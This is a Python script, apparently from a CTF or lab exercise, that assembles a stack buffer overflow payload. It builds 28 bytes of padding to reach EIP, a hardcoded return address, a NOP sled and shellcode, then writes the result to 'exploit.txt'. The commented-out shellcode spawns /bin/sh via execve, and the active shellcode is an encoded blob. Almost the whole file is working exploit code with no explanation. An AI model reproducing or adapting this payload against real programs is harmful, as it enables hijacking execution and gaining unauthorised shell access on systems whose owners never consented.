import struct

# Step 1: Create padding to reach EIP
offset = 28
padding = b"A" * offset  

# Step 2: Find a return address to redirect execution
# This should point to a NOP sled or directly to shellcode

#return_address = b"\xff\xff\xcc\xd0"
return_address = b"\x10\xcc\xff\xff"  # Correct Little-Endian Order


print(return_address.hex())

# Step 3: Add a NOP sled (for safer execution)
nop_sled = b"\x90" * 64  

""""
# my shell code
shellcode = (
    b"\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
    b"\x89\xe1\x31\xc0\xb0\x0b\xcd\x80"
)

#echo -ne ""\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80"" > shellcode.bin
"""
shellcode = (
    b"\xbb\xa1\x2b\x3c\xec\xd9\xc6\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x19\x31\x58\x13\x83\xe8"
    b"\xfc\x03\x58\xae\xc9\xc9\x37\x77\xd4\x46\xec\x83\x59\x48\xbd\x6b\x08\xcf\x0d\xa2\xe5"
    b"\xe2\x40\x46\x1f\x80\x49\x5a\x1c\xf4\x98\xae\x87\x23\xd8\xa7\xf4\x2b\x6b\x41\xfe\x39"
    b"\x42\xd1\x16\x65\xba\xe4\xf3\x0a\x30\x27\x2f\xd6\x8c\xed\x38\xe7\x16\xda\x65\x97\x14"
    b"\x51\xa9\x0e\x34\x75\x56\x3a\xa9\x1e\x49\xf3\x03\x16\x1a\x3f\x48\x12\x6a\x1b\x7d\x02"
    b"\x12\xad\x41\x02\x4b\x48\xea\x6b\xdc\x11\x7c\x53\x95\x3b\x63\x31\x20\x61\xec"

)



# Final exploit string: padding + return address + NOP sled + shellcode
payload = padding + return_address + nop_sled + shellcode


print(payload.hex())
# Save payload to file
with open("exploit.txt", "wb") as f:
    f.write(payload)

print("[+] Exploit file 'exploit.txt' created!")
